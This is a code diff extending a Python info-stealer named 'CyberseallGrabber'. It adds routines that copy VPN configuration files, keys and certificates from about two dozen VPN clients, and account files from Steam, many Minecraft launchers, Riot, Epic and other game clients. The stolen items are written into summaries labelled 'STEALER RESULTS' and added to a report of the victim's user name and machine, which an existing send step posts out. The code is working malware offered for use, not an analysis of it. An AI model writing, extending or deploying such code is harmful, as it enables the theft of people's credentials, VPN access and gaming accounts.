@@ -9,6 +9,8 @@ class CyberseallGrabber:
         self.vt = []
         self.p = []
         self.f = []
+        self.v = []
+        self.ga = []
         self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
         self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
         self.setup()
@@ -16,6 +18,8 @@ class CyberseallGrabber:
         self.vt = self.validate_tokens()
         self.pw()
         self.fi()
+        self.vpn()
+        self.games()
         self.si()
         self.up()
         self.send()
@@ -528,6 +532,85 @@ class CyberseallGrabber:
         except:
             pass
 
+    def vpn(self):
+        try:
+            vpn_data = []
+            
+            # VPN-Pfade basierend auf testdaten/vpns.js
+            vpn_paths = {
+                'OpenVPN Connect': os.path.join(os.getenv("APPDATA"), "OpenVPN Connect", "profiles"),
+                'Mullvad VPN': os.path.join(os.getenv("APPDATA"), "Mullvad VPN"),
+                'Proton VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ProtonVPN"),
+                'Nord VPN': os.path.join(os.getenv("LOCALAPPDATA"), "NordVPN"),
+                'Express VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ExpressVPN"),
+                'CyberGhost': os.path.join(os.getenv("LOCALAPPDATA"), "CyberGhost"),
+                'Surfshark': os.path.join(os.getenv("LOCALAPPDATA"), "Surfshark"),
+                'Vypr VPN': os.path.join(os.getenv("LOCALAPPDATA"), "VyprVPN"),
+                'Windscribe': os.path.join(os.getenv("LOCALAPPDATA"), "Windscribe"),
+                'Hide.me': os.path.join(os.getenv("LOCALAPPDATA"), "hide.me VPN"),
+                'Hotspot Shield': os.path.join(os.getenv("LOCALAPPDATA"), "Hotspot Shield"),
+                'TunnelBear': os.path.join(os.getenv("LOCALAPPDATA"), "TunnelBear"),
+                'IPVanish': os.path.join(os.getenv("LOCALAPPDATA"), "IPVanish"),
+                'HMA VPN': os.path.join(os.getenv("LOCALAPPDATA"), "HMA VPN"),
+                'ZenMate': os.path.join(os.getenv("LOCALAPPDATA"), "ZenMate"),
+                'Pure VPN': os.path.join(os.getenv("LOCALAPPDATA"), "PureVPN"),
+                'TorGuard': os.path.join(os.getenv("LOCALAPPDATA"), "TorGuard"),
+                'Betternet': os.path.join(os.getenv("LOCALAPPDATA"), "Betternet"),
+                'PrivateVPN': os.path.join(os.getenv("LOCALAPPDATA"), "PrivateVPN"),
+                'VPN Unlimited': os.path.join(os.getenv("LOCALAPPDATA"), "VPN Unlimited"),
+                'Goose VPN': os.path.join(os.getenv("LOCALAPPDATA"), "GooseVPN"),
+                'SaferVPN': os.path.join(os.getenv("LOCALAPPDATA"), "SaferVPN"),
+                'Private Internet Access': os.path.join(os.getenv("LOCALAPPDATA"), "Private Internet Access"),
+                'SoftEther VPN': os.path.join("C:", "Program Files", "SoftEther VPN Client")
+            }
+            
+            for vpn_name, vpn_path in vpn_paths.items():
+                if os.path.exists(vpn_path):
+                    try:
+                        # Kopiere VPN-Konfigurationsdateien
+                        vpn_dest = os.path.join(self.d, f"vpn_{vpn_name.replace(' ', '_')}")
+                        if not os.path.exists(vpn_dest):
+                            os.makedirs(vpn_dest)
+                        
+                        # Kopiere wichtige Dateien
+                        for root, dirs, files in os.walk(vpn_path):
+                            for file in files[:20]:  # Limit auf 20 Dateien pro VPN
+                                if file.lower().endswith(('.ovpn', '.conf', '.config', '.json', '.xml', '.dat', '.key', '.crt', '.pem')):
+                                    try:
+                                        src_file = os.path.join(root, file)
+                                        if os.path.getsize(src_file) < 10*1024*1024:  # Max 10MB
+                                            dest_file = os.path.join(vpn_dest, file)
+                                            shutil.copy2(src_file, dest_file)
+                                    except:
+                                        pass
+                        
+                        # Prüfe ob Dateien kopiert wurden
+                        if os.path.exists(vpn_dest) and os.listdir(vpn_dest):
+                            vpn_data.append(f"{vpn_name}: {len(os.listdir(vpn_dest))} files")
+                        else:
+                            try:
+                                os.rmdir(vpn_dest)
+                            except:
+                                pass
+                    except:
+                        pass
+            
+            self.v = vpn_data
+            
+            # Speichere VPN-Zusammenfassung
+            if vpn_data:
+                try:
+                    with open(os.path.join(self.d, "vpn_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("VPN STEALER RESULTS\n")
+                        f.write("=" * 50 + "\n\n")
+                        for vpn_info in vpn_data:
+                            f.write(f"{vpn_info}\n")
+                        f.write(f"\nTotal VPNs found: {len(vpn_data)}\n")
+                except:
+                    pass
+        except:
+            pass
+
     def fi(self):
         try:
             files_data = []
@@ -593,6 +676,138 @@ class CyberseallGrabber:
         except:
             pass
 
+    def games(self):
+        try:
+            game_data = []
+            
+            # Gaming-Pfade basierend auf testdaten/games.js
+            game_paths = {
+                'Steam': {
+                    'config': os.path.join("C:", "Program Files (x86)", "Steam", "config"),
+                    'userdata': os.path.join("C:", "Program Files (x86)", "Steam", "userdata")
+                },
+                'Minecraft': {
+                    'launcher_accounts': os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_accounts_microsoft_store.json"),
+                    'tlauncher': os.path.join(os.getenv("APPDATA"), ".minecraft", "TlauncherProfiles.json"),
+                    'badlion': os.path.join(os.getenv("APPDATA"), "Badlion Client", "accounts.json"),
+                    'lunar': os.path.join(os.getenv("USERPROFILE"), ".lunarclient", "settings", "game", "accounts.json"),
+                    'feather': os.path.join(os.getenv("APPDATA"), ".feather", "accounts.json"),
+                    'impact': os.path.join(os.getenv("APPDATA"), ".minecraft", "Impact", "alts.json"),
+                    'meteor': os.path.join(os.getenv("APPDATA"), ".minecraft", "meteor-client", "accounts.nbt"),
+                    'polymc': os.path.join(os.getenv("APPDATA"), "PolyMC", "accounts.json"),
+                    'rise': os.path.join(os.getenv("APPDATA"), ".minecraft", "Rise", "alts.txt"),
+                    'novoline': os.path.join(os.getenv("APPDATA"), ".minecraft", "Novoline", "alts.novo"),
+                    'paladium': os.path.join(os.getenv("APPDATA"), "paladium-group", "accounts.json")
+                },
+                'Riot Games': {
+                    'config': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Config"),
+                    'data': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Data"),
+                    'logs': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Logs")
+                },
+                'Epic Games': {
+                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
+                },
+                'Uplay': {
+                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
+                },
+                'NationsGlory': {
+                    'localstorage': os.path.join(os.getenv("APPDATA"), "NationsGlory", "Local Storage", "leveldb")
+                }
+            }
+            
+            for game_name, paths in game_paths.items():
+                game_files_found = []
+                
+                for path_name, path_location in paths.items():
+                    if isinstance(path_location, str) and os.path.exists(path_location):
+                        try:
+                            # Erstelle Zielordner
+                            game_dest = os.path.join(self.d, f"game_{game_name.replace(' ', '_')}")
+                            if not os.path.exists(game_dest):
+                                os.makedirs(game_dest)
+                            
+                            if os.path.isfile(path_location):
+                                # Einzelne Datei kopieren
+                                if os.path.getsize(path_location) < 50*1024*1024:  # Max 50MB
+                                    dest_file = os.path.join(game_dest, f"{path_name}_{os.path.basename(path_location)}")
+                                    shutil.copy2(path_location, dest_file)
+                                    game_files_found.append(f"{path_name}: {os.path.basename(path_location)}")
+                            else:
+                                # Ordner kopieren (begrenzt)
+                                path_dest = os.path.join(game_dest, path_name)
+                                if not os.path.exists(path_dest):
+                                    os.makedirs(path_dest)
+                                
+                                file_count = 0
+                                for root, dirs, files in os.walk(path_location):
+                                    for file in files[:10]:  # Max 10 Dateien pro Pfad
+                                        if file.lower().endswith(('.json', '.txt', '.dat', '.config', '.ini', '.xml', '.vdf', '.novo', '.nbt')):
+                                            try:
+                                                src_file = os.path.join(root, file)
+                                                if os.path.getsize(src_file) < 10*1024*1024:  # Max 10MB
+                                                    rel_path = os.path.relpath(src_file, path_location)
+                                                    dest_file = os.path.join(path_dest, rel_path)
+                                                    dest_dir = os.path.dirname(dest_file)
+                                                    if not os.path.exists(dest_dir):
+                                                        os.makedirs(dest_dir)
+                                                    shutil.copy2(src_file, dest_file)
+                                                    file_count += 1
+                                            except:
+                                                pass
+                                        if file_count >= 10:
+                                            break
+                                    if file_count >= 10:
+                                        break
+                                
+                                if file_count > 0:
+                                    game_files_found.append(f"{path_name}: {file_count} files")
+                        except:
+                            pass
+                
+                if game_files_found:
+                    game_data.append(f"{game_name}: {', '.join(game_files_found)}")
+            
+            # Steam spezielle Behandlung für Account-Informationen
+            try:
+                steam_config = os.path.join("C:", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
+                if os.path.exists(steam_config):
+                    with open(steam_config, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                        # Suche nach Steam IDs
+                        steam_ids = re.findall(r'7656[0-9]{13}', content)
+                        if steam_ids:
+                            steam_dest = os.path.join(self.d, "game_Steam")
+                            if not os.path.exists(steam_dest):
+                                os.makedirs(steam_dest)
+                            
+                            with open(os.path.join(steam_dest, "steam_accounts.txt"), "w") as f:
+                                f.write("STEAM ACCOUNT IDS:\n")
+                                f.write("=" * 30 + "\n")
+                                for steam_id in set(steam_ids):
+                                    f.write(f"Steam ID: {steam_id}\n")
+                                    f.write(f"Profile URL: https://steamcommunity.com/profiles/{steam_id}\n\n")
+                            
+                            if "Steam:" not in str(game_data):
+                                game_data.append(f"Steam: {len(set(steam_ids))} account IDs found")
+            except:
+                pass
+            
+            self.ga = game_data
+            
+            # Speichere Gaming-Zusammenfassung
+            if game_data:
+                try:
+                    with open(os.path.join(self.d, "gaming_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("GAMING ACCOUNT STEALER RESULTS\n")
+                        f.write("=" * 50 + "\n\n")
+                        for game_info in game_data:
+                            f.write(f"{game_info}\n")
+                        f.write(f"\nTotal Games found: {len(game_data)}\n")
+                except:
+                    pass
+        except:
+            pass
+
     def si(self):
         try:
             sys_info = {
@@ -603,7 +818,9 @@ class CyberseallGrabber:
                 "tokens_found": len(set(self.t)),
                 "valid_tokens": len(self.vt),
                 "passwords_found": len(self.p),
-                "files_found": len(self.f)
+                "files_found": len(self.f),
+                "vpns_found": len(self.v),
+                "games_found": len(self.ga)
             }
             with open(os.path.join(self.d, "system_info.json"), "w") as f:
                 json.dump(sys_info, f, indent=2)
@@ -689,7 +906,9 @@ class CyberseallGrabber:
                     f.write(f"Browser Passwords: {len(self.p)}\n")
                     f.write(f"Raw Tokens: {len(set(self.t))}\n")
                     f.write(f"Valid Tokens: {len(self.vt)}\n")
-                    f.write(f"Keyword Files: {len(self.f)}\n\n")
+                    f.write(f"Keyword Files: {len(self.f)}\n")
+                    f.write(f"VPN Configurations: {len(self.v)}\n")
+                    f.write(f"Gaming Accounts: {len(self.ga)}\n\n")
                     f.write(f"Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
                     f.write(f"Platform: {platform.platform()}\n")
                     f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
@@ -734,12 +953,14 @@ class CyberseallGrabber:
             total_tokens = len(set(self.t))
             valid_tokens = len(self.vt)
             total_files = len(self.f)
+            total_vpns = len(self.v)
+            total_games = len(self.ga)
             
             # Erstelle eine einzige umfassende Embed
             embed_fields = [
                 {
                     "name": "Results",
-                    "value": f"```Browser Passwords: {total_passwords}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}```",
+                    "value": f"```Browser Passwords: {total_passwords}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}```",
                     "inline": False
                 },
                 {
@@ -786,6 +1007,30 @@ class CyberseallGrabber:
                 embed_fields.append({
                     "name": "Browser Breakdown",
                     "value": f"```{chr(10).join(browser_summary)}```",
+                    "inline": False
+                })
+            
+            # Zeige VPN-Informationen
+            if total_vpns > 0:
+                vpn_summary = []
+                for vpn_info in self.v[:5]:  # Max 5 VPNs anzeigen
+                    vpn_summary.append(vpn_info)
+                
+                embed_fields.append({
+                    "name": "VPN Configurations",
+                    "value": f"```{chr(10).join(vpn_summary)}```",
+                    "inline": False
+                })
+            
+            # Zeige Gaming-Informationen
+            if total_games > 0:
+                game_summary = []
+                for game_info in self.ga[:5]:  # Max 5 Games anzeigen
+                    game_summary.append(game_info)
+                
+                embed_fields.append({
+                    "name": "Gaming Accounts",
+                    "value": f"```{chr(10).join(game_summary)}```",
                     "inline": False
                 })
             
